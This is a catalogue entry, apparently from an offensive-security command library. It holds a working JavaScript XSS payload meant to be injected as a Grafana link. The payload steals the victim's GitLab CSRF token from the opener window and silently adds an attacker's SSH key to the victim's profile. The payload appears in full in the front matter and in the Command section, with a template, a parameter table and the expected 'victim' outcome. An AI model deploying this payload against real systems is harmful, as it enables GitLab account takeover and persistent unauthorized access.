---
id: cmd-js-csrf-ssh-add
data: >-
  javascript:var csrf =
  window.opener.$('meta[name=csrf-token]').attr('content');
  window.opener.$.post('/profile/keys', { 'authenticity_token': csrf,
  'key[key]': 'ssh-rsa
  AAAAB3NzaC1yc2EAAAADAQABAAABAQDUXhvMZ/BFqgVY4iWWv2lrs2alZHA6CoNcnZWH7gxObXGeFK89/itFbI8NrEDE291LRScBL1nuHs0xlf7uidf97uFGVMyIW8TKeaG/j5q6olr9ejiOZhiiGGkQZf1iSTV4VYN77EtG7iV62VB1ZbwnCau1xT5mlXbd8E4WzaHIxuOY8Ao8EozouaQzWt+I1xJx5rufVwItmTaX5QKV5Cuv8GhMRUb1UqujNKr22/rbWnut0pSzB1+uE4S4E1AaCNX9Byy0z65nzupk5kdj8y/qJ3pk8UBOgQtJCFEOwc42EHS3JwTeMRNRXs9bwqRJfXUomXL1LZ5Eua7UX7aQq7pf
  admin@foo.com', 'key[title]': 'admin@foo.com' });
tags:
  - xss
  - csrf-theft
  - ssh-addition
type: command
output: >-
  Successful addition of SSH key to the victim's account, allowing attacker
  access.
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:15.900Z'
verified: false
validated: true
submitted: true
---
---

# javascript-csrf-theft-ssh-addition

## Command

```javascript
javascript:var csrf = window.opener.$('meta[name=csrf-token]').attr('content'); window.opener.$.post('/profile/keys', { 'authenticity_token': csrf, 'key[key]': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUXhvMZ/BFqgVY4iWWv2lrs2alZHA6CoNcnZWH7gxObXGeFK89/itFbI8NrEDE291LRScBL1nuHs0xlf7uidf97uFGVMyIW8TKeaG/j5q6olr9ejiOZhiiGGkQZf1iSTV4VYN77EtG7iV62VB1ZbwnCau1xT5mlXbd8E4WzaHIxuOY8Ao8EozouaQzWt+I1xJx5rufVwItmTaX5QKV5Cuv8GhMRUb1UqujNKr22/rbWnut0pSzB1+uE4S4E1AaCNX9Byy0z65nzupk5kdj8y/qJ3pk8UBOgQtJCFEOwc42EHS3JwTeMRNRXs9bwqRJfXUomXL1LZ5Eua7UX7aQq7pf admin@foo.com', 'key[title]': 'admin@foo.com' });
```

## Description

This advanced JavaScript payload extracts the CSRF token from the opener window using jQuery and submits a POST request to add an SSH public key to the victim's GitLab profile, demonstrating full compromise via stored XSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| key[key] | The SSH public key value | Yes |
| key[title] | Title for the SSH key | Yes |
| authenticity_token | CSRF token extracted from meta tag | Yes (auto-extracted) |

## Examples

### Basic Usage

Inject as Grafana URL:

```javascript
javascript:var csrf = window.opener.$('meta[name=csrf-token]').attr('content'); window.opener.$.post('/profile/keys', { 'authenticity_token': csrf, 'key[key]': 'ssh-rsa [KEY] admin@foo.com', 'key[title]': 'admin@foo.com' });
```

### Advanced Usage

Customize the key and title parameters for different persistence mechanisms.

## Expected Output

Silent execution; SSH key added to /profile/keys endpoint. Verify by checking the victim's SSH keys list.

## Related

- [[commands/javascript-alert-opener-location]]
- [[procedures/Trigger-XSS-via-Metrics-Dashboard-Link]]

---
